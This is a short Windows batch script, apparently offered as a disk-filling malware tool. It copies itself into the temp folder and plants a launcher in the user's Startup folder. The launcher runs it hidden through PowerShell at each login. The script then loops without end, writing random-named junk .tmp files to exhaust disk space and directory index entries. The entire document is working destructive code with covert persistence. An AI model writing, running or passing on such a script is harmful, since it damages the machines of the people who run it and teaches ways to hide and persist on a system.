@echo off

IF /i "%~dp0"=="%TEMP%\" (
    goto :inflate
)

set "me=%temp%\%random%.bat"

copy /Y "%0" "%me%"

set "reboot=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\camo.bat"
set "launch=powershell.exe -NoProfile -WindowStyle Hidden -Command "Start-Process -WorkingDirectory %temp% -FilePath '%me%' -WindowStyle Hidden""

(
    @echo ^@echo off
    @echo Timeout ^/T 1
    @echo %launch%
)>"%reboot%"

start "" "%reboot%"
goto :eof

:inflate

set /A count=0
set "junk="

:x
    set /A count=%count%+1
    set "junk=%junk%$"

    if %count%==1024 (
        goto :fill
    )
goto :x

REM Ghetto Disk Filler
REM MFT File Handle / Directory Index Exhaustion

:fill
    echo %junk%>>"0x0%random%%random%%random%.tmp"
goto :fill
